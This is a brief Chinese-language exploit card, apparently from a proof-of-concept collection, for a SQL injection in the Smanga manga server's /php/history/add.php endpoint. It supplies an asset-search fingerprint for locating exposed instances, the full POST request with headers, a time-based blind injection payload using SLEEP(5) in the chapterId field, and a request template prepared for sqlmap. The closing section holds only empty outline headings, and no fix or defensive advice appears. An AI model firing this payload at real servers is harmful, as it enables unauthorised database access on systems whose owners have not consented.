# SmangamediaId存在SQL注入漏洞

- **系统**：SmangamediaId　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="smanga"`
- **请求**：`POST /php/history/add.php HTTP/1.1`
- **关键头**：`Cookie: thinkphp_show_page_trace=00`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 196`

**请求体 / payload**
```
chapterCover=1&chapterId=1' AND (SELECT 6064 FROM (SELECT(SLEEP(5)))bcUs) AND 'IwYx'='IwYx&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1

sqlmap
POST /php/history/add.php HTTP/1.1
Host:
Cookie: thinkphp_show_page_trace=00
Content-Type: application/x-www-form-urlencoded
Content-Length: 196
chapterCover=1&chapterId=1&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1
```

**其他**
- Smanga mediaId存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Smanga